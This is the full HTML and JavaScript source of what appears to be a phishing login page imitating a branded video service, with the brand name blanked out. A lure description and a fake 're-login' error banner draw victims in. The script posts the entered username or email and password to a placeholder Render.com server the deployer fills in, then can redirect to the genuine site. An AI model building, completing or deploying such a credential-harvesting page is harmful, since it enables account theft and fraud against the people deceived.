<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
  <link rel="shortcut icon" href="img/faviconV2.png">
  <meta name="description" content="Watch this amazing video on BLANK Spotlight!">
  <meta property="og:site_name" content="BLANK Spotlight">
  <title>Login • BLANK</title>
  <style>
    body {
      caret-color: transparent;
      font-family: "Avenir Next", Arial, sans-serif;
      background-color: #ffffff;
      margin: 0; padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      position: relative;
    }
    .login-container {
      text-align: center;
      max-width: 400px;
      width: 83%;
    }
    h1 {
      font-size: 27px;
      color: #000000;
      margin-bottom: 20px;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      font-weight: 500;
    }
    label {
      display: block;
      text-align: left;
      font-size: 12px;
      font-weight: bold;
      color: #55ccffd0;
      margin-top: 20px;
      margin-bottom: 5px;
    }
    input[type="text"],
    input[type="password"],
    input[type="tel"] {
      width: 100%;
      padding: 11px;
      margin-top: 5px;
      border: 1px solid #dcdcdc;
      border-radius: 10px;
      font-size: 14px;
      box-sizing: border-box;
      caret-color: #00A6FF;
    }
    input:focus {
      border-color: #54545436;
      outline: none;
      transition: background-color 0.3s ease;
      box-shadow: 0 0 5px rgba(116,116,116,0.17);
    }
    .password-container {
      position: relative;
      width: 100%;
    }
    .password-container .toggle-password {
      position: absolute;
      right: 5px;
      top: 60%;
      transform: translateY(-50%);
      background: none;
      border: none;
      cursor: pointer;
      font-size: 14px;
      font-family: Arial, Helvetica, sans-serif;
    }
    .save-info {
      display: flex;
      align-items: center;
      margin-top: -10px;
      font-size: 12px;
      justify-content: left;
      font-family: Arial, Helvetica, sans-serif;
    }
    .save-info label {
      color: #bcbcbc;
      font-weight: lighter;
    }
    .alternate-option {
      display: flex;
      align-items: center;
      font-size: 12.8px;
      color: #55ccffd0;
      margin-top: 15px;
      justify-content: left;
      font-family: Arial, Helvetica, sans-serif;
      font-weight: bolder;
    }
    .forgot-password {
      font-size: 12px;
      color: #55ccffd0;
      margin-top: 16px;
      font-family: Arial, Helvetica, sans-serif;
      font-weight: 600;
    }
    .alternate-option a,
    .forgot-password a {
      text-decoration: none;
      color: #55ccffd0;
    }
    input[type="checkbox"] {
      margin-right: 5px;
      margin-top: 20px;
    }
    .login-button {
      position: fixed;
      left: 50%;
      transform: translateX(-50%);
      bottom: 20px;
      width: 210px;
      padding: 12px;
      margin-top: 20px;
      background-color: #a7abad;
      border: none;
      border-radius: 18px;
      font-size: 14px;
      font-weight: bold;
      color: #ffffff;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }
    .login-button.enabled { background-color: #00A6FF; }
    .login-button:hover   { background-color: #027bde; }
    .back-button {
      position: absolute;
      top: 12px;
      left: 10px;
      background-color: transparent;
      border: none;
      font-size: 16px;
      color: #55ccffd0;
      cursor: pointer;
      display: flex;
      align-items: center;
    }
    .back-button:hover { color: #027bde; }
    .incorrect {
      color: red;
      display: none;
      margin-top: -10px;
      margin-left: 5px;
      margin-bottom: 5px;
      font-size: 13px;
      font-weight: 400;
      text-align: left;
    }
    .error-message {
      display: none;
      background-color: #f44336;
      color: white;
      padding: 15px;
      margin: 20px;
      border-radius: 5px;
      font-size: 16px;
      text-align: center;
      animation: fadeIn 0.5s ease-out, vibrate 0.2s ease-in-out 3;
    }
    @keyframes fadeIn {
      from { opacity: 0; } to { opacity: 1; }
    }
    @keyframes vibrate {
      0%   { transform: translateX(0); }
      25%  { transform: translateX(-5px); }
      50%  { transform: translateX(5px); }
      75%  { transform: translateX(-5px); }
      100% { transform: translateX(0); }
    }
    .server-message {
      display: none;
      padding: 10px;
      margin-top: 12px;
      border-radius: 8px;
      font-size: 13px;
      text-align: left;
    }
    .server-message.error {
      display: block;
      background-color: #fff0f0;
      color: #cc0000;
      border: 1px solid #f5c6c6;
    }
    .server-message.success {
      display: block;
      background-color: #f0fff4;
      color: #007a33;
      border: 1px solid #b2dfcc;
    }
  </style>
</head>
<body>

  <button class="back-button" onclick="window.location.href='index.html'">
    <img src="img/left-arrow.png" height="15px" width="15px" alt="back">
  </button>

  <div class="login-container">

    <div id="error-message" class="error-message">
      Something went wrong! Please re-login to your account.
    </div>

    <h1>Log In</h1>

    <form onsubmit="return handleLogin(event)">

      <label for="username">USERNAME OR EMAIL</label>
      <input type="text" id="username" name="name" required>

      <p class="alternate-option">
        <a href="javascript:void(0);" id="switch-to-phone">Use phone number instead</a>
      </p>

      <label for="password">PASSWORD</label>
      <div class="password-container">
        <input type="password" id="password" name="message" required>
        <button type="button" class="toggle-password">
          <img src="img/eye-closed.svg" id="eye-icon" width="20" height="20" alt="eye icon">
        </button>
      </div>

      <div class="incorrect">
        <p>Incorrect password, please try again.</p>
      </div>

      <div id="server-message" class="server-message"></div>

      <div class="save-info">
        <input type="checkbox" id="save-login">
        <label for="save-login">Save Login Info on your device</label>
      </div>

      <p class="forgot-password">
        <a href="#">Forgot your password?</a>
      </p>

      <button type="submit" class="login-button" id="login-btn">Log In</button>

    </form>
  </div>

  <script>
    // !! Replace with your Render.com server URL after deploying !!
    const SERVER_URL = 'https://YOUR-APP-NAME.onrender.com';

    // ── Login: validates then sends to server ────────────────────────
    async function handleLogin(event) {
      event.preventDefault();

      const usernameOrEmail = document.getElementById('username').value.trim();
      const password        = document.getElementById('password').value;
      const incorrectMsg    = document.querySelector('.incorrect');
      const serverMsg       = document.getElementById('server-message');
      const loginBtn        = document.getElementById('login-btn');

      incorrectMsg.style.display = 'none';
      serverMsg.className  = 'server-message';
      serverMsg.textContent = '';

      // Client-side length check (mirrors your original JS)
      if (password.length < 8) {
        incorrectMsg.style.display = 'block';
        return false;
      }

      loginBtn.textContent = 'Logging in…';
      loginBtn.disabled    = true;

      try {
        const res  = await fetch(`${SERVER_URL}/api/login`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ email: usernameOrEmail, password })
        });
        const data = await res.json();

        if (res.ok) {
          serverMsg.className   = 'server-message success';
          serverMsg.textContent = 'Login successful! Redirecting…';
          // Uncomment and update when your redirect is ready:
          // setTimeout(() => window.location.href = 'https://www.BLANK.com/', 1000);
        } else {
          serverMsg.className   = 'server-message error';
          serverMsg.textContent = data.error || 'Login failed. Please try again.';
        }
      } catch (err) {
        serverMsg.className   = 'server-message error';
        serverMsg.textContent = 'Could not reach the server. Please try again.';
      }

      loginBtn.textContent = 'Log In';
      loginBtn.disabled    = false;
      return false;
    }

    // ── Toggle password visibility ───────────────────────────────────
    document.querySelector('.toggle-password').addEventListener('click', function () {
      const passwordField = document.getElementById('password');
      const eyeIcon       = document.getElementById('eye-icon');
      if (passwordField.type === 'password') {
        passwordField.type = 'text';
        eyeIcon.src = 'img/eye-open.svg';
      } else {
        passwordField.type = 'password';
        eyeIcon.src = 'img/eye-closed.svg';
      }
    });

    // ── Switch username/email ↔ phone ────────────────────────────────
    const switchToPhone = document.getElementById('switch-to-phone');
    const usernameInput = document.getElementById('username');
    const usernameLabel = document.querySelector('label[for="username"]');

    switchToPhone.addEventListener('click', function () {
      if (usernameLabel.textContent === 'USERNAME OR EMAIL') {
        usernameLabel.textContent = 'PHONE NUMBER';
        usernameInput.type        = 'tel';
        switchToPhone.textContent = 'Use email instead';
      } else {
        usernameLabel.textContent = 'USERNAME OR EMAIL';
        usernameInput.type        = 'text';
        switchToPhone.textContent = 'Use phone number instead';
      }
    });

    // ── Error banner: show on load, hide on click ────────────────────
    window.onload = function () {
      const errorMessage = document.getElementById('error-message');
      errorMessage.style.display = 'block';
      document.body.addEventListener('click', function () {
        errorMessage.style.display = 'none';
      });
    };
  </script>

</body>
</html>
